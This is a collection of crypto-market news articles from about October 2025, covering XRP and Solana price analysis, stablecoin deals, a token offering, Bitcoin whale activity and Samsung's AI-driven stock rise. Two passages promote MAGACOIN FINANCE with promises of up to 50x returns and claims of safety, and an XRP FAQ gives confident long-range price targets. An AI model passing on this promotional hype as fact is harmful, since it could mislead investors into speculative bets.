In derivatives, momentum has cooled as the futures open interest has slipped to roughly $8.85 billion after briefly topping $9 billion, and liquidation data shows the strain on bulls, over $11 million in long positions were wiped out in a single day versus just $2.4 million for shorts. With RSI hovering in the high-30s/low-40s on lower time frames and MACD leaning negative, the setup favors consolidation or further downside unless spot demand meaningfully re-emerges. On-Chain Flows Turn Risk-Off as XRP Whales Distribute Under the hood, flows are skewing defensive. Exchange data shows more than 320 million XRP moved onto centralized venues in the past week, pushing exchange reserves toward nine-month highs, typically a sign that holders are preparing to sell. Similarly, whale cohorts (1–10 million XRP) have distributed about 440 million tokens over 30 days, adding supply into a soft tape. BNB has flipped XRP for the No. 3 market-cap slot amid record BNB Chain activity, while uncertainty around U.S. spot ETF timelines keeps XRP’s macro catalysts murky. Until those headwinds clear or outflows reverse, rallies into resistance are likely to meet supply. Key Levels to Watch for the XRP Price: $2.68 or $3.15 Decide the Next Leg Technically, XRP is compressing inside a descending triangle, making $2.68–$2.70 the pivotal shelf. Veteran traders warn that a weekly close below $2.687 could open a measured move toward $2.22 (roughly –20% from current prices). Immediate resistance sits at $2.92–$3.00; above that, $3.15 is the line that would invalidate the bearish pattern and shift targets to $3.60–$4.50. In the near term, watch for: Spot-led bids and declining funding on bounces (healthier than leverage-driven pops). Exchange reserve inflections (a downturn would ease sell pressure). Open interest rebuilding without overcrowded longs. With futures interest easing and whales distributing, risk remains skewed to the downside while XRP holds below $3.00. Bulls need a clean, high-volume reclaim of $3.00–$3.15 to flip momentum; otherwise, a $2.70 retest, and potentially $2.22 on a breakdown, stays in play.

While some analysts expect an expansive move across the market, others remain cautious, pointing to Bitcoin’s difficulty in breaking cleanly into price discovery as a potential headwind. Solana, which has rallied strongly in recent weeks, now shows signs of divergence between its price action and underlying network activity — a signal that often raises questions about sustainability. Related Reading: Short-Term Holder Supply Rises By 559K Bitcoin – New Buyers Flood the Market According to Crypto Onchain, a CryptoQuant analyst, a closer look at Solana’s onchain data reveals a negative divergence between its price and the number of network transactions. This means that while SOL’s price continues to climb, overall transaction activity on the network has dropped significantly. Such patterns are typically viewed as warning signs, suggesting that price momentum might be driven more by speculative trading than organic growth in network usage. Still, market sentiment around Solana remains mixed. Bulls argue that the decline in transaction count could stem from structural changes in the network’s voting activity rather than a true drop in user engagement. As Solana consolidates amid these conflicting signals, investors are watching closely to determine whether this volatility marks a healthy correction — or the early signs of exhaustion in its rally. Solana Activity Declines Despite Strong Price Rally According to data from CryptoQuant, Solana’s network is showing a sharp contraction in transactional activity even as its price continues to rally. The daily transaction volume has fallen from roughly 125 million on July 24, 2025, to around 64 million today, marking a drop of nearly 50%. What makes this decline particularly notable is that it has occurred during a period of strong upward movement in SOL’s price, creating a negative divergence between price momentum and network fundamentals. This divergence presents an important warning signal. In a healthy market environment, price appreciation should ideally be supported by growth in real ecosystem usage — meaning more DeFi activity, NFT transactions, and user transfers. Instead, the data suggests that Solana’s recent rally could be driven more by market sentiment and speculative enthusiasm rather than sustained organic demand on-chain. However, to understand the full picture, it’s necessary to examine which transactions are declining. Historically, 80–90% of Solana’s activity consists of “voting” transactions, which are essential for maintaining network consensus. A reduction in those does not necessarily reflect lower user activity. If, however, the drop stems from reduced DeFi and NFT interactions, it could signal weakening fundamentals behind Solana’s price surge. Analysts are watching closely to determine whether this trend represents a temporary technical adjustment or an early warning of speculative overheating. If user-driven activity continues to decline, Solana could face increased risk of a deeper correction, testing whether the recent price rally is truly sustainable. Related Reading: Coinbase Premium Gap Signals Strongest Bitcoin Accumulation Since ETF Launch – Details Price Analysis: Consolidation After a Strong Rally Solana (SOL) is showing signs of consolidation after an extended rally that pushed its price above the $240 level earlier this month. The chart reveals that SOL has entered a short-term corrective phase, currently trading near $221, down about 3.5% on the day. Despite the pullback, Solana maintains a bullish market structure, as it continues to trade above the key 50-day, 100-day, and 200-day moving averages, which are trending upward — a sign that momentum remains in favor of the bulls. The $210–$215 zone stands out as the immediate support area, coinciding with the 50-day moving average. Holding above this level would confirm that buyers remain in control and could prepare the asset for another attempt to reclaim $240–$250. A successful breakout above these levels could open the path toward $280, where Solana faced resistance in late 2024.

Overall, Solana appears to be stabilizing after its recent surge, and maintaining support above the 50-day MA will be key for sustaining bullish momentum as the market awaits confirmation of the next major move.

Despite recent volatility, several well-established projects and a few emerging names are showing remarkable resilience – and analysts believe they could deliver substantial gains once market momentum accelerates. Among them, MAGACOIN FINANCE has emerged as a standout favorite, with experts predicting up to 50x returns once it lists on major exchanges. Meanwhile, heavyweights like Cardano (ADA), TRON (TRX), Chainlink (LINK), and Dogecoin (DOGE) continue to surprise the market with steady performance and expanding use cases. Together, these five assets represent some of the most compelling opportunities of the current cycle. Cardano (ADA) – Preparing for Its Next Leap Cardano has been quietly consolidating above key support levels, maintaining its reputation as one of the most development-focused networks in the crypto ecosystem. With the Voltaire governance era nearing full implementation, ADA holders are set to gain increased influence over network decisions, marking a new chapter of decentralization. Despite its slow and methodical approach, Cardano’s fundamentals remain strong. Analysts believe the completion of its governance upgrades and scaling efforts could trigger renewed market interest, setting the stage for ADA to reclaim higher valuations as the 2025 bull market gains pace. TRON (TRX) – The Unsung Utility Powerhouse T RON has continued to outperform expectations in 2025, driven by growing adoption of its stablecoin infrastructure and DeFi applications. The network’s fast and low-cost transactions have made it one of the preferred platforms for transferring digital assets globally. With TRON’s total value locked (TVL) steadily climbing and partnerships expanding across Asia, the project’s fundamentals have never looked stronger. Its consistent on-chain growth has led analysts to classify TRX as one of the most undervalued top-20 cryptocurrencies, particularly given its strong profitability and network activity during bear cycles. MAGACOIN FINANCE – The Next 50x Opportunity While established networks continue to build, MAGACOIN FINANCE has taken the spotlight as the most promising new altcoin of 2025. The project’s meteoric rise during its presale, raising millions from early investors, reflects its growing global demand and expanding ecosystem. Experts believe that once MAGACOIN FINANCE secures listings on major exchanges, early participants could see returns as high as 50x, fueled by rising liquidity and community adoption. The project’s ecosystem design prioritizes long-term growth over short-term hype, integrating real-world use cases and partnerships aimed at sustained market relevance. Its social momentum has also exploded in recent weeks, making MAGACOIN FINANCE one of the most talked-about crypto projects across X (Twitter), Telegram, and Reddit. With strong fundamentals and rising visibility, many analysts see it as the next major altcoin to lead the 2025 bull market. Chainlink (LINK) – Powering the Next Generation of DeFi Chainlink continues to dominate the decentralized data sector, serving as the backbone of on-chain connectivity for both DeFi and institutional blockchain integrations. Its Cross-Chain Interoperability Protocol (CCIP) is gaining traction rapidly, enabling secure asset and data transfers across multiple blockchains. With traditional finance institutions experimenting with tokenized assets and smart contract automation, Chainlink’s technology is positioned at the heart of the transformation. LINK’s relatively low valuation compared to its utility has prompted many to label it undervalued, especially given the role it’s expected to play in the next phase of crypto adoption. Dogecoin (DOGE) – From Meme to Mainstream Dogecoin’s transformation from a joke to a corporate-backed digital reserve has been one of 2025’s biggest surprises. Institutional interest is surging, led by CleanCore Solutions, which recently launched a $175 million Dogecoin Treasury, now holding over 710 million DOGE. The company’s plan to expand its holdings to 1 billion DOGE has validated Dogecoin’s position as more than just a meme coin – it’s now part of the growing corporate crypto treasury trend. Combined with network upgrades like the Cardinals Index Node, Dogecoin is evolving into a credible, large-cap digital asset that still trades well below its potential. The Bottom Line The current market cycle is proving that innovation and community-driven growth still define crypto success. While giants like Bitcoin and Ethereum dominate headlines, it’s often the undervalued altcoins that deliver the most impressive gains during bullish recoveries. With MAGACOIN FINANCE leading the charge among emerging projects, and established names like Cardano, TRON, Chainlink, and Dogecoin showing renewed strength, investors are keeping a close eye on these assets as prime candidates for exponential upside in 2025.

XRP has a strong community of supporters and developers and continues to see tremendous potential in Ripple’s technology and products. Despite short-term price fluctuations and a bear market, many analysts believe XRP has a bright future. Whether it will reach new highs or continue to grow steadily remains to be seen, and despite its history of legal battles with the Securities and Exchange Commission, this digital asset will undoubtedly play an important role in global financial institutions.

Technical indicators give bearish signals, and the price charts also project a bearish market scenario for the day. Is XRP a good investment? XRP, a cryptocurrency specifically designed for quick and cost-effective cross-border transactions, holds promise in global finance. The easing of regulatory hurdles for Ripple, along with the rising adoption, might boost the XRP price. Additionally, several recent acquisitions and CBDC developments make XRP a good long-term investment option. As with any investment, the outlook for XRP remains uncertain, necessitating a cautious approach and thorough due diligence. It is advised to proceed with caution Why is XRP down? The XRP/USD crypto pair price has decreased as selling pressure took hold, bringing the price to $2.80 during the day. The RSI decreased to 41.75 at the same time and is in neutral territory. How much will XRP cost in 2025? XRP is expected to trade at an average price of $4.47 by the end of 2025. Will XRP reach $5? For XRP to reach $5, its value would need to increase significantly. Considering the current bullish trend and XRP’s price action, a surge to $5 by the end of this year is not entirely out of the question, particularly if demand for XRP tokens continues to rise and its growth trajectory remains consistent. However, it’s crucial to remember that XRP’s all-time high stands at $3.65, achieved on July 18, 2025. Can XRP reach $20? According to Ripple’s price prediction, XRP has a chance of reaching $20 by 2030. However, it is expected to reach this level if the XRP ecosystem adoption by major financial institutions continues, making it a good option to buy XRP. Will XRP reach $100 dollars? Though there are rumors of XRP reaching $100 in the market, and some pro-XRP analysts are also promoting it, many are raising questions about this possibility. XRP may not reach $100 in the near future, at least. Still, the token provides a good buying opportunity to investors looking for long-term goals. However, one’s own research is advised before making the investment decision. Will XRP reach $1000? If one XRP coin is worth $1000, its market cap must be more than $100 trillion. Comparatively, the total global stock market cap is about $110 trillion. Therefore, it is unlikely that XRP will reach $1000, based on current market dynamics. Does XRP have a good long-term future? XRP is expected to increase in value gradually over the coming years, giving good yields to XRP holders and institutional investors. The coin is trading at five times its value from last year, and it is expected to reach the highest price of $23.24 by 2031. This makes it a valuable asset for multiple gains after significant market capitalization with continuous efforts by Ripple Labs. However, regulatory uncertainties still linger with the Ripple lawsuit. Considering these factors, investors must carry out their own research. Recent news/opinions on the Ripple Network Cryptopolitan reported that Ripple CTO David Schwartz is stepping back from his daily duties at Ripple Labs after more than 13 years at the firm. He also noted that he isn’t leaving the company permanently and will join the company board. He will stay as CTO Emeritus, an honorary title. XRP price prediction October 2025 According to the Ripple price prediction, in October 2025, XRP could reach a maximum price of $3.60. The average trading price is expected to be $2.92 for the month, while the lowest it can go, as per XRP cost estimation, is $2.30, considering the current XRP sentiment.

XRP historic price sentiment XRP price history: Coinmarketcap Before 2017, the asset’s value hovered around $0.01; in April 2017, it rose to $0.05; the gradual climb soon continued as it reached $0.25 in May, showing a positive price action as Ripple continued to excel. Towards the end of 2019, XRP price stabilized at around $0.30 and did not cross the $0.5 mark throughout the year. However, the bullish run of 2020 pushed the coin’s value to a peak price of $0.8, gaining investor interest before finishing the year at $0.66. Early 2021 was supposed to be bullish for XRP, but the SEC announced a lawsuit that derailed investors. Nonetheless, XRP beat the odds and surged above $1.5 during the year, but by 2022, it plummeted significantly to as low as $0.31. XRP started 2023 at $0.335, and on July 13, it almost doubled its value in a steep spike. It shot from $0.470 to $0.814 while swinging towards $0.9 for a few hours. A partial victory against the SEC triggered the price jump, surging the trading volume. XRP closed 2023 at about $0.62. In 2024, XRP has so far ridden the market wave. The bears earlier on and then a bullish price movement by mid-March resulted in a market price of $0.72, according to data from the cryptocurrency market. In July, XRP traded between $0.418 and $0.658, showing a good recovery. However, the coin went under bearish pressure at the start of August, falling back down to the $0.550 range as per crypto market records showing high volatility. In September 2024, XRP recovered up to the $0.642 level, but the price went down to the $0.500 range in October. A tremendous bullish impulse was observed in November when XRP touched the $1.96 mark, and it reached $2.72 on December 2, 2024. In January 2025, XRP reached a peak price of $3.19 and traded near the $2.90 level in February. It stepped down to $2.1 in March and to $1.79 in April. By the middle of May, XRP touched $2.57, and in July, it marked a new all-time high of $3.65. Near the start of August 2025, XRP was trending above $3, showing significant growth as the market sentiment was tilting toward the positive side; however, it lost $3 by the end of the month. In October, XRP is trending near the $2.9 range.",Crypto Price Predictions|Ripple|XRP,EN,0,0,XRP|TRADING|MARKET|TECHNOLOGY|BUSINESS|REGULATION|ASIA|BLOCKCHAIN|RESEARCH|CRYPTOCURRENCY,"{'name': 'Cryptopolitan', 'img': 'https://images.cryptocompare.com/news/default/cryptopolitan.png', 'lang': 'EN'}",cryptopolitan,2025-10-10 04:30:00

Key Takeaways: Coinbase and Mastercard are in advanced talks to acquire UK-based stablecoin firm BVNK. BVNK, founded in 2021, provides stablecoin infrastructure for payments and cross-border transactions. The talks come amid a stablecoin boom, with the market surpassing $300 billion. The deal, estimated between $1.5 billion and $2.5 billion, remains under negotiation with no confirmed winner, though sources say Coinbase currently has the upper hand. If completed, the acquisition would mark a major milestone for both the crypto and traditional finance sectors, underscoring the growing convergence between blockchain-based payments and established financial infrastructure. BVNK Emerges as Key Infrastructure Provider Powering Global Stablecoin Payments Founded in 2021, BVNK has quickly become one of the most prominent players in stablecoin infrastructure. The company helps businesses integrate stablecoins into payments, cross-border transactions, and global treasury operations. Its clients include financial institutions seeking to move money instantly without relying on traditional rails. BVNK previously raised $50 million in a December round led by Haun Ventures, with participation from Coinbase Ventures, Tiger Global, and Visa and Citi’s venture arms. The firm was valued at roughly $750 million at the time. If the deal closes, it would surpass Stripe’s $1.1 billion acquisition of Bridge, a stablecoin startup purchased earlier this year. Both moves highlight the strategic value stablecoin infrastructure now holds for fintech and payments leaders. The interest from Coinbase and Mastercard comes as stablecoins are experiencing explosive growth. The activity in tokenization right now is off the charts. Coinbase & MasterCard are in deep talks to acquire BVNK for $2B+ according to Fortune. m0 raised a $40M series B. USDAI just successfully structured a $500M deal for collateralized AI investments.

The legislation provides a federal framework for stablecoin issuance and transparency, fueling new institutional demand. Stablecoins, digital tokens pegged to fiat currencies like the US dollar, have become central to global payments innovation. Proponents argue they are faster, cheaper, and more efficient than legacy systems, with settlement times in seconds rather than days. Banks Turn to Stablecoins as Competition Increases In August, Citigroup CEO Jane Fraser confirmed the bank is “looking at the issuance of a Citi stablecoin” while developing tokenized deposit services for corporate clients seeking 24/7 settlement capabilities. Earlier in June, JPMorgan also launched JPMD deposit tokens for institutional blockchain payments while CEO Jamie Dimon was questioning its use case . The bank served as lead underwriter for Circle’s IPO, which has climbed over 500% since its $31 offering price. It also appears that some institutions are showing approval to control stablecoins, as seen in the recent Bank of England’s proposal for strict ownership . The bank caps between £10,000 and £20,000 for individuals and £10 million for businesses, which triggered widespread backlash. As reported, Crypto.com is integrating Morpho , the second-largest DeFi lending protocol, into its platform to launch stablecoin lending markets directly on the Cronos blockchain. The partnership will allow users to deposit wrapped versions of Bitcoin and Ethereum (CDCBTC and CDCETH) and borrow stablecoins against them without leaving the Crypto.com ecosystem.

These figures position it among the leading projects in the Sui ecosystem by volume and TVL growth. The platform is now preparing for its next phase with the launch of the $MMT Community Offering on Buidlpad, which will allow broader participation in the project’s governance and development. Platform Overview Momentum Finance describes itself as a full-scale liquidity protocol designed for scalability, performance, and capital efficiency. Its infrastructure is based on Uniswap v3-style concentrated liquidity, enhanced by Sui’s parallel execution architecture to support high-throughput, low-latency transactions. Key developments in Momentum’s first six months include: Attracted 2M+ unique traders Crossed $16B in cumulative volume Surpassed $500M in TVL Locked $222M in boosted liquidity through the HODL campaign Momentum Finance to Launch $MMT Community Offering on Buidlpad Following six months of growth across trading volume and total value locked (TVL), Momentum Finance is moving forward with the $MMT Community Offering, which will be hosted on the Buidlpad platform. Offering Structure and Access The offering aims to raise $4.5 million, with two participation tiers. Tier 1 participants — those who stake $3,000 or more in eligible Buidlpad HODL pools before October 25 — will access tokens at a fully diluted valuation (FDV) of $250 million and may receive higher contribution caps. Tier 2, open to all verified users who complete KYC between October 22–25, will participate at a $350 million FDV. All $MMT tokens allocated in this offering will be fully unlocked at the token generation event (TGE), with no vesting or lock-up periods. Collaboration with Buidlpad Momentum Finance and Buidlpad have previously collaborated through the HODL Campaign, which has contributed over $222 million in additional TVL. The campaign offered users increased APY and 2x Bricks rewards, ahead of the TGE. The community offering is the next phase of this collaboration, designed to facilitate wider access to the protocol’s token distribution. Important Dates UGC Campaign Deadline : October 22, 2025, at 09:59 AM UTC KYC & Subscription Period : October 22–25 Contribution Window : October 27–28 Token Claim : 100% unlocked at TGE (date to be announced) Context Momentum Finance's reported growth — including over $16 billion in trading volume and $500 million in TVL — reflects increasing adoption within the Sui blockchain ecosystem. The protocol is built using Uniswap v3-style liquidity infrastructure and leverages Sui’s parallel execution for scalability and performance. As the ecosystem continues to develop, Momentum aims to establish a position as a key liquidity provider within the network. Further details on the $MMT Community Offering are available via Buidlpad . About Momentum Momentum is building the financial operating system of the tokenised world starting on Sui. Think Robinhood’s ease of use and scale, but fully decentralized and global. In just six months, it has gone from zero to $500M in liquidity, onboarded over 2.1 million users, and hit $1.1B in daily trading volume yesterday. That makes it the #3 DEX globally, right next to Uniswap and Pancake. Momentum is the Robinhood of the tokenised era. It is not just another DEX, it is building the platform where anyone, retail or institutional , can trade anything, anywhere, fully on-chain. With Sui's unique retail base, generous ecosystem incentives, and a ve(3,3) flywheel that pumps value back into $MMT with every trade, it is setting the foundation for a $10B+ protocol.

The premier cryptocurrency by market value briefly fell to $120,000 during the overnight trade, dragging the broader market lower. Ether (ETH) dropped 2.4% in the past 24 hours to reverse all gains from the past 7 days, Solana’s SOL, xrp (XRP), dogecoin (DOGE) and Cardano’s ADA fell up to 3%, CoinDesk data show. The weak tone in BTC contradicts the continued demand for the U.S.-listed spot ETFs. This week, ETFs have pulled in $2.72 billion in inflows, which traders said marks the asset’s emerging role as a digital hedge alongside gold, which itself broke through the $4,000 per ounce barrier this week. Those numbers are difficult to ignore, especially with the Federal Reserve leaning dovish after its September rate cut. Pauses, however, have been common during recent rallies. After peaking in July, bitcoin slid 9% in the following three weeks before turning higher. August experienced a similar timeframe but a deeper 14% retrace. FxPro’s Alex Kuptsikevich said in an email to CoinDesk that we could see a similar pullback into the $107,000–115,000 range before October ends, especially with the Fed’s rate decision on the 29th looming as a key macro marker. “However, even attempts to move below the upper limit of this range will cause concern in the markets, with a crucial date on the horizon—the Fed's decision on the key rate on 29 October,” he added. That range now defines the balance between dip buyers and patient shorts. The derivatives market is less stretched than it was last month, with CryptoQuant noting a sharp easing in seller pressure. Looking ahead, ETF flows would be the real test of whether spot demand is sticky or simply front-loaded. The macro frame hasn’t changed much. The U.S. government shutdown drags into a second week, leaving investors in the dark on official data prints. Still, the uncertainty created by the shutdown favours assets with haven appeal, such as gold and bitcoin, per analysts. The yellow metal broke above $4,000 this week. For BTC, the key line remains $125,000. Grind into it, and the demand likely absorbs the supply. Snap back too fast, and we’re likely back into the $115,000–$118,000 chop. Privacy shines Privacy has re-entered the market conversation in a way we haven’t seen for years. Zcash (ZEC) is up nearly 80% in a week and more than 400% since late summer. Monero (XMR), Dash (DASH), and smaller players like Railgun have caught a strong bid, too, rallying as much as 40% in the past 24 hours. This comes amid increasing activity on Near’s privacy messaging tools, a renewed interest in tokens like Zcash, and the Ethereum Foundation’s plans to support a research cluster in the coming months, as reported .",Markets|Markets|Trading|News,EN,0,0,CRYPTOCURRENCY|BTC|MACROECONOMICS|MARKET|DOGE,"{'name': 'CoinDesk', 'img': 'https://resources.cryptocompare.com/news/5/default.png', 'lang': 'EN'}",coindesk,2025-10-10 04:57:00

The transaction, tracked by Arkham Intelligence, was directed to Hyperunit’s DeFi wallet – the same destination previously used when the investor converted billions of dollars’ worth of Bitcoin into Ethereum earlier this year. That earlier move in August saw the whale exchange $2.59 billion in BTC for $2.2 billion in ETH, followed by the opening of a $577 million ETH long position. The reallocation sparked a wave of copycat trades and temporarily made the whale one of the largest individual Ethereum holders in the world, surpassing even some corporate treasuries. This time, traders are watching closely to see whether the funds will again be rotated into Ether or redistributed across other assets. The address still holds more than $5 billion in Bitcoin, meaning any significant sale or transfer could influence market sentiment. Amid the renewed whale activity, investors are also diversifying into emerging opportunities – and MAGACOIN FINANCE, a newly audited project by CertiK and HashEx, has quickly become the standout pick among retail traders seeking high-ROI potential. Dormant Wallets Wake Up The whale’s sudden reappearance isn’t the only sign of movement beneath the surface. According to CryptoQuant, long-term Bitcoin holders have also become more active. Dormant wallets – inactive for three to five years – recently transferred 32,300 BTC (worth nearly $4 billion) to exchanges, marking the largest transfer of 2025. Renowned analyst Willy Woo highlighted that these “OG whales,” many of whom accumulated Bitcoin at prices below $10, can significantly impact liquidity and sentiment when they move coins. Their coordinated behavior often precedes large market rotations or corrections, and traders are closely monitoring on-chain patterns for early clues of what’s next. Despite the outflows, market analysts note that demand for Bitcoin remains strong. The cryptocurrency continues to serve as a hedge against macroeconomic uncertainty, particularly amid ongoing concerns about U.S. fiscal policy and global debt levels. A New Altcoin Steals the Spotlight While large investors debate between Bitcoin and Ethereum, retail traders are increasingly drawn to MAGACOIN FINANCE – a project that has managed to combine security, transparency, and high-growth potential in a way few altcoins have achieved. Having completed full audits from CertiK and HashEx, MAGACOIN FINANCE has cemented its reputation as one of the safest and most promising presales of 2025. The project’s verified security protocols and robust community support have made it a top contender for massive gains once listed on major exchanges. Experts say the project’s ecosystem-driven model and focus on continuous expansion could make it a defining success of the upcoming altcoin season. Many early investors are already anticipating exponential returns, projecting MAGACOIN FINANCE to outperform several top altcoins as liquidity rotates out of Bitcoin and into newer, higher-growth opportunities. Bitcoin Retains Its Safe-Haven Status Even as whales shift capital between assets, Bitcoin’s broader narrative remains intact. Analysts from Bitget and Matrixport agree that Bitcoin continues to be viewed as a scarce, non-sovereign hedge – especially attractive in a climate of weakening fiat currencies and central bank stimulus. Ryan Lee of Bitget said that institutional investors are maintaining long positions, treating Bitcoin as a “core macro hedge” within their portfolios. Meanwhile, Matrixport’s latest report suggests that Bitcoin is regaining market dominance after Ethereum and select altcoins briefly led the market earlier this quarter. “The rally remains selective, not broad-based,” Matrixport noted, implying that major capital remains concentrated in a few top-performing assets while most altcoins lag behind. Still, if whale capital again rotates into Ethereum, the market could experience another temporary shift in momentum, potentially fueling renewed inflows into DeFi and smart-contract platforms. Outlook: Volatility Returns as Whales Move Again Whether this week’s whale activity signals another rotation into Ethereum or a broader rebalancing across crypto assets, one thing is clear: big money is moving again. Historically, such shifts have preceded major market rallies – and with institutional inflows returning and retail enthusiasm rising, volatility could soon surge across the board. For investors seeking balance between security and growth, projects like MAGACOIN FINANCE are gaining traction as the next major breakout candidates. As rate cuts approach and capital flows return to risk assets, both Bitcoin and innovative newcomers could define the next stage of crypto’s growth cycle.

Solana Digital Asset Treasury Firm Helius Aiming For At Least 5% Of SOL As reported by Wu Blockchain , NASDAQ-listed Helius Medical Technologies is planning on acquiring at least 5% of the total SOL supply. The information comes from an interview between the Hong Kong Economic Times (HKET) and Joseph Chee, Executive Chairman of Helius and Chairman of Summer Capital. Helius Medical Technologies is a neurotech company that last month pivoted to a digital asset treasury (DAT) strategy centered around Solana, the cryptocurrency currently ranked sixth by market cap. The firm closed an initial private placement offering, raising over $500 million on September 18th, with the likes of Pantera Capital and Summer Capital among the backers. Helius has since been deploying this capital to purchase SOL for its treasury. According to a press release published Monday, the DAT company now holds more than 2.2 million tokens of the cryptocurrency. To reinforce its shift in business, Helius rebranded to “Solana Company” after receiving board approval on September 29th. The firm stated in the announcement that its mission is to “maximize SOL per share on one of the most commercially viable blockchains for consumer applications while delivering consistent on-chain yield for investors.” At the current Solana price, the company’s treasury is worth around $488.8 million. On top of this, it still holds about $15 million in cash, meaning that the firm already possesses more capital than it initially raised in September. If the firm’s Chairman is to go by, though, the DAT company is nowhere near done with its accumulation. With a target of 5% of the SOL supply in circulation, the goal represents a total investment of over $6 billion at the latest exchange rate. Chee also told HKET that once market cap and regulatory requirements are met, Solana Company is planning a second listing in Hong Kong, which could potentially happen within the next six months. During the latest acquisition announcement, Chee said: HSDT Solana Company’s investment narrative is resonating with institutional investors. We are encouraged by the strong interest coming out of Asia after the major digital assets conferences last week, and we look forward to continuing to be a leading advocate for the Solana ecosystem to a whole new set of investors. Helius’ pivot is just part of a broader SOL treasury wave that the sector has witnessed over the past month. Forward Industries, a design and manufacturing company, completed a $1.58 billion purchase on September 15th as it shifted to a Solana DAT strategy backed by Galaxy Digital, Jump Crypto, and Multicoin Capital.

Bitcoin Net Realized Profit/Loss Is Still At Moderate Levels In a new post on X, CryptoQuant has shared the latest trend in the Bitcoin Net Realized Profit/Loss. This indicator tells us about whether the Bitcoin investors are selling their coins at a net profit or loss. The metric works by going through the transaction history of each token being spent to see what price it was moved at before this. If this previous selling price for any coin was less than the spot price it’s now being transacted at, then the token’s sale is assumed to be leading to the realization of some net profit. Related Reading: XRP Could Retest Triangle Support At $2.72, Analyst Warns The degree of profit realized is naturally equal to the difference between the two prices. In tokens of the opposite case (that is, the last price is higher than the latest spot BTC value), the sale realizes a loss instead. In the context of the current discussion, the version of the Net Realized/Profit Loss that’s of interest is specifically the 1-year sum, denominated in BTC. Below is the chart for the metric that shows how its value has fluctuated over the past few years. From the graph, it’s visible that the Bitcoin Net Realized Profit/Loss witnessed an uptrend in 2024 and reached a high of 5.1 million BTC in January 2025. This suggests that the market took part in a significant amount of profit-taking that year. After the January peak, however, the metric reversed course and started going down instead. This decline in profit realization was a result of the bearish price action that the cryptocurrency faced in the first few months of the year. After bullish winds returned for the cryptocurrency, though, the Net Realized Profit/Loss once again began to move up. This upward trajectory has naturally continued alongside BTC’s latest rally to a new all-time high (ATH) and the indicator has reached the 4.4 million BTC mark. Though this value is significant, it’s clearly lower than the January 2025 top. This earlier peak itself was still lower than the 7.7 million October 2021 high from the previous cycle.

CryptoSensei (@Crypt0Senseii), a popular crypto commentator, shared the video on X, where Bitboy explained how XRP is addressing cross-border payments, one of the most persistent inefficiencies in global finance. As Armstrong explained, XRP operates with a purpose distinct from speculative trading. Its goal is to make international payments much faster, and Bitboy outlined the asset’s ambition to streamline and modernize a system that still relies heavily on decades-old processes . Donald Trump Jr. and Ben Armstrong (BitBoy) discussed using #XRP for cross-border payments across the U.S.! XRP is gaining momentum as the global standard for value transfer! pic.twitter.com/Oke13P0gDn — CryptoSensei (@Crypt0Senseii) October 8, 2025 Reimagining the Banking Framework During the discussion, Armstrong drew a sharp comparison between XRP and the traditional SWIFT network that underpins most global financial transfers. He described Bitcoin and XRP as “networks of value,” while noting that the SWIFT system remains a “network of information.” In practical terms, that difference means SWIFT only sends transaction messages between banks, leaving the actual movement of funds to occur later through manual or delayed processes. While SWIFT sends messages, XRP solves the problem of liquidity , increasing the speed and efficiency of the overall system. “When something is happening on the SWIFT system,” he said, “it’s always got to come in on the back end and do all the work.” Armstrong went on to highlight the frustration many businesses face when transferring money internationally, pointing to time zones and manual verifications as key causes of settlement delays. We are on X, follow us to connect with us :- @TimesTabloid1 — TimesTabloid (@TimesTabloid1) June 15, 2025 Speed and Efficiency as Core Advantages According to Armstrong, XRP aims to eliminate those bottlenecks. He explained that traditional international payments often take “five to seven days” to settle, while XRP transactions can complete “in 30 seconds.” That speed, combined with lower costs and the ability to bridge currencies , forms the foundation of Ripple’s push to modernize global finance. Donald Trump Jr. responded briefly throughout the conversation, acknowledging Armstrong’s explanations. This discussion comes at a time when digital assets are entering mainstream political dialogue. President Donald Trump has publicly signaled support for cryptocurrency innovation and has spoken about positioning the U.S. as a leader in the digital economy. If Trump’s camp takes a deeper look at XRP’s framework for global payments, it could represent a shift in how traditional political figures view blockchain technology. By introducing XRP’s model of efficiency and real-time settlement to Trump Jr., Armstrong extended the conversation about financial modernization to one of the most influential political families in the U.S. Whether this leads to further engagement remains to be seen. However, it places XRP at the center of an important conversation about the future of cross-border payments.

According to the company’s October 10 stock report, Samsung’s stock jumped 6% to 94,300 won in Seoul as markets reopened after a week-long holiday. As the largest company in South Korea by market capitalization, its shares have increased by 76% this year, boosting its market value to $390 billion. Samsung’s advanced AI approach escalates its shares to an all-time high Following Samsung’s impressive outlook , investors have become more optimistic that the company will catch up with its smaller competitor, SK Hynix Inc., in offering high-bandwidth memory to Nvidia Corp. and other firms for AI applications. Another factor contributing to this positive trend is a major supply deal with OpenAI, which involves both Samsung and SK Hynix Inc. Shawn Oh, an equities trader at NH Investment & Securities Co., commented on the topic of discussion, highlighting that the tech giant’s discount is fading when it comes to providing Nvidia with high-bandwidth memory and continuous significant investments in AI. According to the equities trader, reports indicate that Nvidia and Samsung are close to finalizing talks regarding supply volumes, prices, and timelines. On the other hand, the traditional DRAM and NAND chip markets, which Samsung leads, are expected to enter a “supercycle” as the supply shortage increases price expectations. During the week-long market holiday in South Korea, which ended on October 6, analysts from Morgan Stanley raised their early price target for Samsung to 111,000 won, reflecting a 14% increase. A notable surge in the tech company’s memory chip prices for the fourth quarter and a strong demand for its products, which is anticipated to continue until 2026, triggered this increase. The analysts believe these factors suggest a potential for substantial breakthroughs in the future. Meanwhile, it is worth noting that Samsung’s shares ended September with the most remarkable monthly performance since 2020 after struggling with a low position in the AI global surge ranking early this year. The tech company’s shares had also attained an all-time high in 2021. Unlike the current peak driven by foreign investors, local retail investors had fueled this surge in stock during the pandemic. OpenAI strikes significant deals with Samsung and SK Hynix in the AI boom era Samsung and SK Hynix’s considerable stock escalation has generally amounted to 145% in 2025. This has positioned South Korea as one of the best-performing stock markets in the year. Additionally, the benchmark Kospi, a crucial stock market index that tracks the performance of big firms based in South Korea, has also climbed 50% in 2025. This outstanding accomplishment was observed after the tech companies struck early deals to provide chips for OpenAI’s Stargate project, enhancing their position in AI memory. Regarding the deal, OpenAI’s Sam Altman agreed to include Samsung and SK Hynix in his project to build data centers . As previously reported by Cryptopolitan , Altman met with South Korean President Lee Jae-myung and the chairmen of Samsung and SK Hynix at the presidential office in Seoul last week, before the announcement. OpenAI had collaborated with SoftBank and Oracle in January to unveil the $500 billion Stargate project. Notably, the worldwide initiative involves major industry players, such as Nvidia Corp. and Oracle Corp. The companies said the US startup could require as many as 900,000 wafers a month as Stargate expands. This demand estimate exceeds twice the worldwide current HBM (high-bandwidth memory) capacity, which is indicative of the adaptability and scope of Stargate and its potential contribution to global AI development in a rapidly evolving market, said SK Group.

